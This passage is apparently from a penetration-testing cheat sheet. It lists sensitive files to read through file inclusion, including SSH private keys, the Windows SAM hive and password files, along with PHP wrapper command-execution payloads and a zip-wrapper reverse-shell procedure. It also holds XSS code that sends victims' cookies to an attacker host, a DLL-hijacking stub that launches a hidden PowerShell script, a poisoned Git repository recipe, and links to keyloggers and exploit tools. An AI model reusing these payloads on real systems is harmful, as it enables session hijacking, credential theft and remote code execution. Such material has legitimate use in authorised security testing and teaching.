| /etc/httpd/srm.conf                      |
|                                          |
| /etc/inetd.conf                          |
|                                          |
| /etc/inittab                             |
|                                          |
| /etc/issue                               |
|                                          |
| /etc/lighttpd.conf                       |
|                                          |
| /etc/lilo.conf                           |
|                                          |
| /etc/logrotate.d/ftp                     |
|                                          |
| /etc/logrotate.d/proftpd                 |
|                                          |
| /etc/logrotate.d/vsftpd.log              |
|                                          |
| /etc/lsb-release                         |
|                                          |
| /etc/motd                                |
|                                          |
| /etc/modules.conf                        |
|                                          |
| /etc/motd                                |
|                                          |
| /etc/mtab                                |
|                                          |
| /etc/my.cnf                              |
|                                          |
| /etc/my.conf                             |
|                                          |
| /etc/mysql/my.cnf                        |
|                                          |
| /etc/network/interfaces                  |
|                                          |
| /etc/networks                            |
|                                          |
| /etc/npasswd                             |
|                                          |
| /etc/passwd                              |
|                                          |
| /etc/php4.4/fcgi/php.ini                 |
|                                          |
| /etc/php4/apache2/php.ini                |
|                                          |
| /etc/php4/apache/php.ini                 |
|                                          |
| /etc/php4/cgi/php.ini                    |
|                                          |
| /etc/php4/apache2/php.ini                |
|                                          |
| /etc/php5/apache2/php.ini                |
|                                          |
| /etc/php5/apache/php.ini                 |
|                                          |
| /etc/php/apache2/php.ini                 |
|                                          |
| /etc/php/apache/php.ini                  |
|                                          |
| /etc/php/cgi/php.ini                     |
|                                          |
| /etc/php.ini                             |
|                                          |
| /etc/php/php4/php.ini                    |
|                                          |
| /etc/php/php.ini                         |
|                                          |
| /etc/printcap                            |
|                                          |
| /etc/profile                             |
|                                          |
| /etc/proftp.conf                         |
|                                          |
| /etc/proftpd/proftpd.conf                |
|                                          |
| /etc/pure-ftpd.conf                      |
|                                          |
| /etc/pureftpd.passwd                     |
|                                          |
| /etc/pureftpd.pdb                        |
|                                          |
| /etc/pure-ftpd/pure-ftpd.conf            |
|                                          |
| /etc/pure-ftpd/pure-ftpd.pdb             |
|                                          |
| /etc/pure-ftpd/putreftpd.pdb             |
|                                          |
| /etc/redhat-release                      |
|                                          |
| /etc/resolv.conf                         |
|                                          |
| /etc/samba/smb.conf                      |
|                                          |
| /etc/snmpd.conf                          |
|                                          |
| /etc/ssh/ssh\_config                     |
|                                          |
| /etc/ssh/sshd\_config                    |
|                                          |
| /etc/ssh/ssh\_host\_dsa\_key             |
|                                          |
| /etc/ssh/ssh\_host\_dsa\_key.pub         |
|                                          |
| /etc/ssh/ssh\_host\_key                  |
|                                          |
| /etc/ssh/ssh\_host\_key.pub              |
|                                          |
| /etc/sysconfig/network                   |
|                                          |
| /etc/syslog.conf                         |
|                                          |
| /etc/termcap                             |
|                                          |
| /etc/vhcs2/proftpd/proftpd.conf          |
|                                          |
| /etc/vsftpd.chroot\_list                 |
|                                          |
| /etc/vsftpd.conf                         |
|                                          |
| /etc/vsftpd/vsftpd.conf                  |
|                                          |
| /etc/wu-ftpd/ftpaccess                   |
|                                          |
| /etc/wu-ftpd/ftphosts                    |
|                                          |
| /etc/wu-ftpd/ftpusers                    |
|                                          |
| /logs/pure-ftpd.log                      |
|                                          |
| /logs/security\_debug\_log               |
|                                          |
| /logs/security\_log                      |
|                                          |
| /opt/lampp/etc/httpd.conf                |
|                                          |
| /opt/xampp/etc/php.ini                   |
|                                          |
| /proc/cpuinfo                            |
|                                          |
| /proc/filesystems                        |
|                                          |
| /proc/interrupts                         |
|                                          |
| /proc/ioports                            |
|                                          |
| /proc/meminfo                            |
|                                          |
| /proc/modules                            |
|                                          |
| /proc/mounts                             |
|                                          |
| /proc/stat                               |
|                                          |
| /proc/swaps                              |
|                                          |
| /proc/version                            |
|                                          |
| /proc/self/net/arp                       |
|                                          |
| /root/anaconda-ks.cfg                    |
|                                          |
| /usr/etc/pure-ftpd.conf                  |
|                                          |
| /usr/lib/php.ini                         |
|                                          |
| /usr/lib/php/php.ini                     |
|                                          |
| /usr/local/apache/conf/modsec.conf       |
|                                          |
| /usr/local/apache/conf/php.ini           |
|                                          |
| /usr/local/apache/log                    |
|                                          |
| /usr/local/apache/logs                   |
|                                          |
| /usr/local/apache/logs/access\_log       |
|                                          |
| /usr/local/apache/logs/access.log        |
|                                          |
| /usr/local/apache/audit\_log             |
|                                          |
| /usr/local/apache/error\_log             |
|                                          |
| /usr/local/apache/error.log              |
|                                          |
| /usr/local/cpanel/logs                   |
|                                          |
| /usr/local/cpanel/logs/access\_log       |
|                                          |
| /usr/local/cpanel/logs/error\_log        |
|                                          |
| /usr/local/cpanel/logs/license\_log      |
|                                          |
| /usr/local/cpanel/logs/login\_log        |
|                                          |
| /usr/local/cpanel/logs/stats\_log        |
|                                          |
| /usr/local/etc/httpd/logs/access\_log    |
|                                          |
| /usr/local/etc/httpd/logs/error\_log     |
|                                          |
| /usr/local/etc/php.ini                   |
|                                          |
| /usr/local/etc/pure-ftpd.conf            |
|                                          |
| /usr/local/etc/pureftpd.pdb              |
|                                          |
| /usr/local/lib/php.ini                   |
|                                          |
| /usr/local/php4/httpd.conf               |
|                                          |
| /usr/local/php4/httpd.conf.php           |
|                                          |
| /usr/local/php4/lib/php.ini              |
|                                          |
| /usr/local/php5/httpd.conf               |
|                                          |
| /usr/local/php5/httpd.conf.php           |
|                                          |
| /usr/local/php5/lib/php.ini              |
|                                          |
| /usr/local/php/httpd.conf                |
|                                          |
| /usr/local/php/httpd.conf.ini            |
|                                          |
| /usr/local/php/lib/php.ini               |
|                                          |
| /usr/local/pureftpd/etc/pure-ftpd.conf   |
|                                          |
| /usr/local/pureftpd/etc/pureftpd.pdn     |
|                                          |
| /usr/local/pureftpd/sbin/pure-config.pl  |
|                                          |
| /usr/local/www/logs/httpd\_log           |
|                                          |
| /usr/local/Zend/etc/php.ini              |
|                                          |
| /usr/sbin/pure-config.pl                 |
|                                          |
| /var/adm/log/xferlog                     |
|                                          |
| /var/apache2/config.inc                  |
|                                          |
| /var/apache/logs/access\_log             |
|                                          |
| /var/apache/logs/error\_log              |
|                                          |
| /var/cpanel/cpanel.config                |
|                                          |
| /var/lib/mysql/my.cnf                    |
|                                          |
| /var/lib/mysql/mysql/user.MYD            |
|                                          |
| /var/local/www/conf/php.ini              |
|                                          |
| /var/log/apache2/access\_log             |
|                                          |
| /var/log/apache2/access.log              |
|                                          |
| /var/log/apache2/error\_log              |
|                                          |
| /var/log/apache2/error.log               |
|                                          |
| /var/log/apache/access\_log              |
|                                          |
| /var/log/apache/access.log               |
|                                          |
| /var/log/apache/error\_log               |
|                                          |
| /var/log/apache/error.log                |
|                                          |
| /var/log/apache-ssl/access.log           |
|                                          |
| /var/log/apache-ssl/error.log            |
|                                          |
| /var/log/auth.log                        |
|                                          |
| /var/log/boot                            |
|                                          |
| /var/htmp                                |
|                                          |
| /var/log/chttp.log                       |
|                                          |
| /var/log/cups/error.log                  |
|                                          |
| /var/log/daemon.log                      |
|                                          |
| /var/log/debug                           |
|                                          |
| /var/log/dmesg                           |
|                                          |
| /var/log/dpkg.log                        |
|                                          |
| /var/log/exim\_mainlog                   |
|                                          |
| /var/log/exim/mainlog                    |
|                                          |
| /var/log/exim\_paniclog                  |
|                                          |
| /var/log/exim.paniclog                   |
|                                          |
| /var/log/exim\_rejectlog                 |
|                                          |
| /var/log/exim/rejectlog                  |
|                                          |
| /var/log/faillog                         |
|                                          |
| /var/log/ftplog                          |
|                                          |
| /var/log/ftp-proxy                       |
|                                          |
| /var/log/ftp-proxy/ftp-proxy.log         |
|                                          |
| /var/log/httpd/access\_log               |
|                                          |
| /var/log/httpd/access.log                |
|                                          |
| /var/log/httpd/error\_log                |
|                                          |
| /var/log/httpd/error.log                 |
|                                          |
| /var/log/httpsd/ssl.access\_log          |
|                                          |
| /var/log/httpsd/ssl\_log                 |
|                                          |
| /var/log/kern.log                        |
|                                          |
| /var/log/lastlog                         |
|                                          |
| /var/log/lighttpd/access.log             |
|                                          |
| /var/log/lighttpd/error.log              |
|                                          |
| /var/log/lighttpd/lighttpd.access.log    |
|                                          |
| /var/log/lighttpd/lighttpd.error.log     |
|                                          |
| /var/log/mail.info                       |
|                                          |
| /var/log/mail.log                        |
|                                          |
| /var/log/maillog                         |
|                                          |
| /var/log/mail.warn                       |
|                                          |
| /var/log/message                         |
|                                          |
| /var/log/messages                        |
|                                          |
| /var/log/mysqlderror.log                 |
|                                          |
| /var/log/mysql.log                       |
|                                          |
| /var/log/mysql/mysql-bin.log             |
|                                          |
| /var/log/mysql/mysql.log                 |
|                                          |
| /var/log/mysql/mysql-slow.log            |
|                                          |
| /var/log/proftpd                         |
|                                          |
| /var/log/pureftpd.log                    |
|                                          |
| /var/log/pure-ftpd/pure-ftpd.log         |
|                                          |
| /var/log/secure                          |
|                                          |
| /var/log/vsftpd.log                      |
|                                          |
| /var/log/wtmp                            |
|                                          |
| /var/log/xferlog                         |
|                                          |
| /var/log/yum.log                         |
|                                          |
| /var/mysql.log                           |
|                                          |
| /var/run/utmp                            |
|                                          |
| /var/spool/cron/crontabs/root            |
|                                          |
| /var/webmin/miniserv.log                 |
|                                          |
| /var/www/log/access\_log                 |
|                                          |
| /var/www/log/error\_log                  |
|                                          |
| /var/www/logs/access\_log                |
|                                          |
| /var/www/logs/error\_log                 |
|                                          |
| /var/www/logs/access.log                 |
|                                          |
| /var/www/logs/error.log                  |
|                                          |
| \~/.atfp\_history                        |
|                                          |
| \~/.bash\_history                        |
|                                          |
| \~/.bash\_logout                         |
|                                          |
| \~/.bash\_profile                        |
|                                          |
| \~/.bashrc                               |
|                                          |
| \~/.gtkrc                                |
|                                          |
| \~/.login                                |
|                                          |
| \~/.logout                               |
|                                          |
| \~/.mysql\_history                       |
|                                          |
| \~/.nano\_history                        |
|                                          |
| \~/.php\_history                         |
|                                          |
| \~/.profile                              |
|                                          |
| \~/.ssh/authorized\_keys                 |
|                                          |
| \~/.ssh/id\_dsa                          |
|                                          |
| \~/.ssh/id\_dsa.pub                      |
|                                          |
| \~/.ssh/id\_rsa                          |
|                                          |
| \~/.ssh/id\_rsa.pub                      |
|                                          |
| \~/.ssh/identity                         |
|                                          |
| \~/.ssh/identity.pub                     |
|                                          |
| \~/.viminfo                              |
|                                          |
| \~/.wm\_style                            |
|                                          |
| \~/.Xdefaults                            |
|                                          |
| \~/.xinitrc                              |
|                                          |
| \~/.Xresources                           |
|                                          |
| \~/.xsession                             |
+------------------------------------------+

Running Process Information (Linux)
-----------------------------------

+--------------------------+
| /proc/\<int\>/fd/\<int\> |
|                          |
| e.g.                     |
|                          |
| /proc/2116/fd/11         |
+--------------------------+

Interesting Files (Windows)
---------------------------

+--------------------------------------------------------------+
| \%SYSTEMROOT%repairsystem                                    |
|                                                              |
| \%SYSTEMROOT%repairSAM                                       |
|                                                              |
| \%SYSTEMROOT%repairSAM                                       |
|                                                              |
| \%WINDIR%win.ini                                             |
|                                                              |
| \%SYSTEMDRIVE%boot.ini                                       |
|                                                              |
| \%WINDIR%Panthersysprep.inf                                  |
|                                                              |
| \%WINDIR%system32configAppEvent.Evt                          |
|                                                              |
| C:/Users/Administrator/NTUser.dat                            |
|                                                              |
| C:/Documents and Settings/Administrator/NTUser.dat           |
|                                                              |
| C:/apache/logs/access.log                                    |
|                                                              |
| C:/apache/logs/error.log                                     |
|                                                              |
| C:/apache/php/php.ini                                        |
|                                                              |
| C:/boot.ini                                                  |
|                                                              |
| C:/inetpub/wwwroot/global.asa                                |
|                                                              |
| C:/MySQL/data/hostname.err                                   |
|                                                              |
| C:/MySQL/data/mysql.err                                      |
|                                                              |
| C:/MySQL/data/mysql.log                                      |
|                                                              |
| C:/MySQL/my.cnf                                              |
|                                                              |
| C:/MySQL/my.ini                                              |
|                                                              |
| C:/php4/php.ini                                              |
|                                                              |
| C:/php5/php.ini                                              |
|                                                              |
| C:/php/php.ini                                               |
|                                                              |
| C:/Program Files/Apache Group/Apache2/conf/httpd.conf        |
|                                                              |
| C:/Program Files/Apache Group/Apache/conf/httpd.conf         |
|                                                              |
| C:/Program Files/Apache Group/Apache/logs/access.log         |
|                                                              |
| C:/Program Files/Apache Group/Apache/logs/error.log          |
|                                                              |
| C:/Program Files/FileZilla Server/FileZilla Server.xml       |
|                                                              |
| C:/Program Files/MySQL/data/hostname.err                     |
|                                                              |
| C:/Program Files/MySQL/data/mysql-bin.log                    |
|                                                              |
| C:/Program Files/MySQL/data/mysql.err                        |
|                                                              |
| C:/Program Files/MySQL/data/mysql.log                        |
|                                                              |
| C:/Program Files/MySQL/my.ini                                |
|                                                              |
| C:/Program Files/MySQL/my.cnf                                |
|                                                              |
| C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err    |
|                                                              |
| C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log   |
|                                                              |
| C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err       |
|                                                              |
| C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log       |
|                                                              |
| C:/Program Files/MySQL/MySQL Server 5.0/my.cnf               |
|                                                              |
| C:/Program Files/MySQL/MySQL Server 5.0/my.ini               |
|                                                              |
| C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf  |
|                                                              |
| C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf   |
|                                                              |
| C:/Program Files (x86)/Apache Group/Apache/conf/access.log   |
|                                                              |
| C:/Program Files (x86)/Apache Group/Apache/conf/error.log    |
|                                                              |
| C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml |
|                                                              |
| C:/Program Files (x86)/xampp/apache/conf/httpd.conf          |
|                                                              |
| C:/WINDOWS/php.ini                                           |
|                                                              |
| C:/WINDOWS/Repair/SAM                                        |
|                                                              |
| C:/Windows/repair/system                                     |
|                                                              |
| C:/Windows/repair/software                                   |
|                                                              |
| C:/Windows/repair/security                                   |
|                                                              |
| C:/WINDOWS/System32/drivers/etc/hosts                        |
|                                                              |
| C:/Windows/win.ini                                           |
|                                                              |
| C:/WINNT/php.ini                                             |
|                                                              |
| C:/WINNT/win.ini                                             |
|                                                              |
| C:/xampp/apache/bin/php.ini                                  |
|                                                              |
| C:/xampp/apache/logs/access.log                              |
|                                                              |
| C:/xampp/apache/logs/error.log                               |
|                                                              |
| C:/Windows/Panther/Unattend/Unattended.xml                   |
|                                                              |
| C:/Windows/Panther/Unattended.xml                            |
|                                                              |
| C:/Windows/debug/NetSetup.log                                |
|                                                              |
| C:/Windows/system32/config/AppEvent.Evt                      |
|                                                              |
| C:/Windows/system32/config/SecEvent.Evt                      |
|                                                              |
| C:/Windows/system32/config/default.sav                       |
|                                                              |
| C:/Windows/system32/config/security.sav                      |
|                                                              |
| C:/Windows/system32/config/software.sav                      |
|                                                              |
| C:/Windows/system32/config/system.sav                        |
|                                                              |
| C:/Windows/system32/config/regback/default                   |
|                                                              |
| C:/Windows/system32/config/regback/sam                       |
|                                                              |
| C:/Windows/system32/config/regback/security                  |
|                                                              |
| C:/Windows/system32/config/regback/system                    |
|                                                              |
| C:/Windows/system32/config/regback/software                  |
|                                                              |
| C:/Program Files/MySQL/MySQL Server 5.1/my.ini               |
|                                                              |
| C:/Windows/System32/inetsrv/config/schema/ASPNET\_schema.xml |
|                                                              |
| C:/Windows/System32/inetsrv/config/applicationHost.config    |
|                                                              |
| C:/inetpub/logs/LogFiles/W3SVC1/u\_ex\[YYMMDD\].log          |
+--------------------------------------------------------------+

Interesting Files (OSX)
-----------------------

+--------------------+
| /etc/fstab         |
|                    |
| /etc/master.passwd |
|                    |
| /etc/resolv.conf   |
|                    |
| /etc/sudoers       |
|                    |
| /etc/sysctl.conf   |
+--------------------+

Reading PHP/Binary File Contents
--------------------------------

Including a file in the following format will return the contents in
Base64 encoding (May be useful for reading binary data)

  -------------------------------------------------------------------------
  php://filter/read=convert.base64-encode/resource=**\<file\_to\_read\>**
  -------------------------------------------------------------------------

PHP Wrappers
------------

### PHP Expect Wrapper (Not default)

Could result in code execution.

  ----------------------
  php?page=expect://ls
  ----------------------

### PHP Input Wrapper

  --------------------------
  ?page=php://input&cmd=ls
  --------------------------

### PHP Zip Wrapper

+-----------------------------------------------------------------------+
| 1.  Create a PHP reverse shell                                        |
|                                                                       |
| 2.  Compress to a .zip file                                           |
|                                                                       |
| 3.  Upload the compressed shell payload to the server                 |
|                                                                       |
| 4.  Use the zip wrapper to extract the payload using:                 |
|     > php?page=zip://path/to/file.zip%23shell                         |
|                                                                       |
| 5.  The above will extract the zip file to shell, if the server does  |
|     > not append .php rename it to shell.php instead                  |
+-----------------------------------------------------------------------+

XSS
===

SVG Tag
-------

  -----------------------------------------------------------------------------------------------------
  \<svg/onload=location=window\[\`atob\`\]\`amF2YXNjcmlwdDphbGVydCgxKQ==\`;// https://t.co/pwtrIsYUTt
  -----------------------------------------------------------------------------------------------------

Send Cookie & URL via JavaScript HTTP Request (All Browsers)
------------------------------------------------------------

  ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  function a(t){window.XMLHttpRequest?b=new XMLHttpRequest:b=new ActiveXObject(\"Microsoft.XMLHTTP\"),b.onreadystatechange=function(){4==b.readyState&&200==b.status&&alert(b.responseText)},b.open(\"GET\",t,!1),b.send()}a(\"http:/**/\<ip\_address\>**:**\<port\>**/somefile.php?cookie=\"+document.cookie+\"&location=\"+document.location);
  ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Send Cookie in IMG Request via Added Element
--------------------------------------------

+--------------------------------------------------------+
| function addIMG() {                                    |
|                                                        |
| > var img = document.createElement(\'img\');           |
| >                                                      |
| > img.src = \'**\<server\_URL\>**\' + document.cookie; |
| >                                                      |
| > document.body.appendChild(img);                      |
|                                                        |
| }                                                      |
|                                                        |
| addIMG();                                              |
+--------------------------------------------------------+

Using Stolen Cookies
====================

From the inspection console.

  -------------------------------------
  document.cookie=\"**\<cookie\>**\";
  -------------------------------------

COM Objects
===========

List All Available COM Objects
------------------------------

  -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  Get-ChildItem HKLM:\\Software\\Classes -ErrorAction SilentlyContinue \| Where-Object { \$\_.PSChildName -match \'\^\\w+\\.\\w+\$\' -and (Test-Path -Path \"\$(\$\_.PSPath)\\CLSID\") } \| Select-Object -ExpandProperty PSChildName
  -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Creating PowerShell COM Objects by CLSID
----------------------------------------

  -------------------------------------------------------------------------------
  \$type= \[Type\]::GetTypeFromCLSID(\'13709620-C279-11CE-A49E-444553540000\')\
  \$obj = \[Activator\]::CreateInstance(\$type)

  -------------------------------------------------------------------------------

Vulnerabilities/Exploits
========================

DLL Hijacking
-------------

### C++ Function Export Example

The following code will export a single function called
**VolumeDismount**.

+-----------------------------------------------------------------------+
| \#define EXPORT comment(linker, \"/EXPORT:\" \_\_FUNCTION\_\_ \"=\"   |
| \_\_FUNCDNAME\_\_)                                                    |
|                                                                       |
| using namespace std;                                                  |
|                                                                       |
| int VolumeDismount(string drive)                                      |
|                                                                       |
| {                                                                     |
|                                                                       |
| \#pragma EXPORT                                                       |
|                                                                       |
| system(\"calc.exe\");                                                 |
|                                                                       |
| return 0;                                                             |
|                                                                       |
| }                                                                     |
+-----------------------------------------------------------------------+

### C++ EntryPoints & Exports

This example will run a command when the process attaches, it will also
pop **calc.exe** when one of the exported functions is called.

+-----------------------------------------------------------------------+
| \#include \"stdafx.h\"                                                |
|                                                                       |
| \#include \<stdlib.h\>                                                |
|                                                                       |
| BOOL APIENTRY DllMain(HMODULE hModule,                                |
|                                                                       |
| DWORD ul\_reason\_for\_call,                                          |
|                                                                       |
| LPVOID lpReserved                                                     |
|                                                                       |
| )                                                                     |
|                                                                       |
| {                                                                     |
|                                                                       |
| switch (ul\_reason\_for\_call)                                        |
|                                                                       |
| {                                                                     |
|                                                                       |
| case DLL\_PROCESS\_ATTACH:                                            |
|                                                                       |
| system(\"start powershell -win hidden -nonI -nopro -ep bypass -File   |
| shell.ps1\");                                                         |
|                                                                       |
| case DLL\_THREAD\_ATTACH:                                             |
|                                                                       |
| case DLL\_THREAD\_DETACH:                                             |
|                                                                       |
| case DLL\_PROCESS\_DETACH:                                            |
|                                                                       |
| break;                                                                |
|                                                                       |
| }                                                                     |
|                                                                       |
| return TRUE;                                                          |
|                                                                       |
| }                                                                     |
|                                                                       |
| extern \"C\" \_\_declspec(dllexport) void SendARP()                   |
|                                                                       |
| {                                                                     |
|                                                                       |
| WinExec(\"calc\", SW\_NORMAL);                                        |
|                                                                       |
| }                                                                     |
|                                                                       |
| extern \"C\" \_\_declspec(dllexport) void GetIpNetTable()             |
|                                                                       |
| {                                                                     |
|                                                                       |
| WinExec(\"calc\", SW\_NORMAL);                                        |
|                                                                       |
| }                                                                     |
|                                                                       |
| extern \"C\" \_\_declspec(dllexport) void DeleteIpNetEntry()          |
|                                                                       |
| {                                                                     |
|                                                                       |
| WinExec(\"calc\", SW\_NORMAL);                                        |
|                                                                       |
| }                                                                     |
+-----------------------------------------------------------------------+

CVE Repositories
----------------

[[https://nvd.nist.gov/]{.underline}](https://nvd.nist.gov/)

[[http://cve.mitre.org/index.html]{.underline}](http://cve.mitre.org/index.html)

[[http://www.cvedetails.com/]{.underline}](http://www.cvedetails.com/)

[[https://www.scaprepo.com/]{.underline}](https://www.scaprepo.com/)

[[http://secpod.com/]{.underline}](http://secpod.com/)

[[http://osvdb.org/]{.underline}](http://osvdb.org/)

[[http://www.exploit-db.com/]{.underline}](http://www.exploit-db.com/)

[[https://github.com/athiasjerome/XORCISM]{.underline}](https://github.com/athiasjerome/XORCISM)

Bug Repositories
----------------

Git
---

### CVE-2014-9390

[[https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial]{.underline}](https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial)

[[https://github.com/rapid7/metasploit-framework/issues/4435]{.underline}](https://github.com/rapid7/metasploit-framework/issues/4435)

This exploit relies on the machine running Git to be using a file system
that ignores case (i.e. Windows, OS X)

Building a poisoned Git repository:

+------------------------------------------------------------+
| \$ mkdir -p \<repository\_folder\>/.Git/hooks/             |
|                                                            |
| \$ cd \<repository\_folder\>                               |
|                                                            |
| \$ git init                                                |
|                                                            |
| \$ echo \"\<command to run\>\" \> .Git/hooks/post-checkout |
|                                                            |
| \$ git add -A                                              |
|                                                            |
| \$ git commit - \'poisoned\'                               |
+------------------------------------------------------------+

Once this poisoned Git repository is cloned the command in the
post-checkout will be run on the machine that it is being cloned to. The
command will run with the rights of the user running Git.

Default Password Links
======================

[[http://www.cirt.net/passwords]{.underline}](http://www.cirt.net/passwords)

[[http://www.virus.org/default-passwords/]{.underline}](http://www.virus.org/default-passwords/)

[[http://www.routerpasswords.com/]{.underline}](http://www.routerpasswords.com/)

[[https://www.security-database.com/dbe.php]{.underline}](https://www.security-database.com/dbe.php)

Useful Links
============

GitHub Links
------------

### ETW Keylogger POC

-   [[https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC]{.underline}](https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC)

### SubTee (Casey Smith) C\# Keylogger

-   [[https://gist.github.com/subTee/c51ea995dfaf919fd4bd36b3f7252486]{.underline}](https://gist.github.com/subTee/c51ea995dfaf919fd4bd36b3f7252486)

-   [[https://gist.github.com/subTee/d32a4912b2798197663e883ea6a68937]{.underline}](https://gist.github.com/subTee/d32a4912b2798197663e883ea6a68937)

### HackSysTeam Extreme Vulnerability Driver (HEVD)

-   [[https://github.com/GradiusX/HEVD-Python-Solutions]{.underline}](https://github.com/GradiusX/HEVD-Python-Solutions)

### DLLInjector

-   [[https://github.com/OpenSecurityResearch/dllinjector]{.underline}](https://github.com/OpenSecurityResearch/dllinjector)

PowerShell Tools
----------------

### Empire

-   [https://github.com/PowerShellEmpire/Empire]{.underline}

### PowerSploit

-   [[https://github.com/PowerShellMafia/PowerSploit]{.underline}](https://github.com/PowerShellMafia/PowerSploit)

### Nishang

-   [https://github.com/samratashok/nishang]{.underline}

### PowerUpSQL

-   [https://github.com/NetSPI/PowerUpSQL]{.underline}

### P0wnedShell

-   [https://github.com/Cn33liz/p0wnedShell]{.underline}

### Awesomershell

-   [https://github.com/Ben0xA/AwesomerShell]{.underline}

### Not PowerShell (nps)

-   [https://github.com/Ben0xA/nps]{.underline}

Other Things
------------

### PyKEK (Python Kerberos Exploitation Kit)

-   [[https://github.com/bidord/pykek]{.underline}](https://github.com/bidord/pykek)

### Misc Scripts

-   [[http://thesprawl.org/research/writing-nse-scripts-for-vulnerability-scanning/]{.underline}](http://thesprawl.org/research/writing-nse-scripts-for-vulnerability-scanning/)

-   [[http://www.scip.ch/?labs.20130625]{.underline}](http://www.scip.ch/?labs.20130625)

-   [[https://www.powershellgallery.com/packages/Save-ScreenCapture/1.0.0.0/DisplayScript]{.underline}](https://www.powershellgallery.com/packages/Save-ScreenCapture/1.0.0.0/DisplayScript)

-   [[https://www.powershellgallery.com/packages/Test-IsVirtual/1.0.0.0/DisplayScript]{.underline}](https://www.powershellgallery.com/packages/Test-IsVirtual/1.0.0.0/DisplayScript)

### Kyle's Notes

-   [[https://www.evernote.com/pub/kbisdorf/adsim]{.underline}](https://www.evernote.com/pub/kbisdorf/adsim)

### Google Hacking Links

-   [[https://www.exploit-db.com/google-hacking-database/]{.underline}](https://www.exploit-db.com/google-hacking-database/)

### Hot Potato (Privilege Escalation)

-   [[https://github.com/foxglovesec/Potato]{.underline}](https://github.com/foxglovesec/Potato)

### Raspberry PI as a USB Device

-   [[http://isticktoit.net/?p=1383]{.underline}](http://isticktoit.net/?p=1383)

-   [[https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget?view=all]{.underline}](https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget?view=all)

-   [[https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget/ethernet-gadget]{.underline}](https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget/ethernet-gadget)

### PoisonTap (Raspberry PI USB Ethernet Device)

-   [[https://github.com/samyk/poisontap]{.underline}](https://github.com/samyk/poisontap)

### USB Ethernet Device Driver Example

-   [[https://github.com/ev3dev/ev3-systemd/blob/ev3dev-jessie/scripts/ev3-usb.sh]{.underline}](https://github.com/ev3dev/ev3-systemd/blob/ev3dev-jessie/scripts/ev3-usb.sh)

### Responder

-   [[https://github.com/lgandx/Responder.git]{.underline}](https://github.com/lgandx/Responder.git)

### Pi USB Ethernet 

-   [[https://hackaday.io/project/10387-gadget/log/34463-on-windows-drivers-and-usb-gadgets]{.underline}](https://hackaday.io/project/10387-gadget/log/34463-on-windows-drivers-and-usb-gadgets)

-   [[http://isticktoit.net/?p=1383]{.underline}](http://isticktoit.net/?p=1383)

-   [[https://www.kernel.org/doc/Documentation/usb/gadget\_configfs.txt]{.underline}](https://www.kernel.org/doc/Documentation/usb/gadget_configfs.txt)

-   [[https://groups.google.com/forum/m/\#!msg/beaglebone/IKV0g14oYRQ/8Z\_vEv\_fAwAJ]{.underline}](https://groups.google.com/forum/m/#!msg/beaglebone/IKV0g14oYRQ/8Z_vEv_fAwAJ)

### Manually Interacting w/HTTP

-   [[http://www.the-art-of-web.com/system/telnet-http11/]{.underline}](http://www.the-art-of-web.com/system/telnet-http11/)

### Fingerprinting IIS

-   [[https://blogs.msdn.microsoft.com/vijaysk/2010/09/01/fingerprinting-iis/]{.underline}](https://blogs.msdn.microsoft.com/vijaysk/2010/09/01/fingerprinting-iis/)

### Old AccessChk.exe

-   [[https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe]{.underline}](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe)

### DLL Injection

-   [[http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html?m=1]{.underline}](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html?m=1)

### MS14-068 (Pass-the-Credential Cache)

-   [[https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/]{.underline}](https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/)

-   [[https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/]{.underline}](https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/)

### Dumping Credentials

-   [[https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/]{.underline}](https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/)

### IIS 6.0 Exploit (CVE-2017-7269)

-   [[https://github.com/edwardz246003/IIS\_exploit/blob/master/exploit.py]{.underline}](https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py)

-   [[https://github.com/zcgonvh/cve-2017-7269/blob/master/cve-2017-7269.rb]{.underline}](https://github.com/zcgonvh/cve-2017-7269/blob/master/cve-2017-7269.rb)

-   [[https://www.exploit-db.com/exploits/41738/]{.underline}](https://www.exploit-db.com/exploits/41738/)

### MimiPenguin

-   [[https://github.com/huntergregal/mimipenguin]{.underline}](https://github.com/huntergregal/mimipenguin)

### HackSys Extreme Vulnerable Driver (HEVD)

-   [[https://github.com/hacksysteam/HackSysExtremeVulnerableDriver]{.underline}](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)

### HackSysTeam-KernelPwn (\@FuzzySec, uses HEVD)

-   [[https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn]{.underline}](https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn)

### Less Dirty Cow (Crontab)

-   [[https://github.com/securifera/cowcron]{.underline}](https://github.com/securifera/cowcron)

### Shellcode Via JavaScript Via VBA (\@subTee)

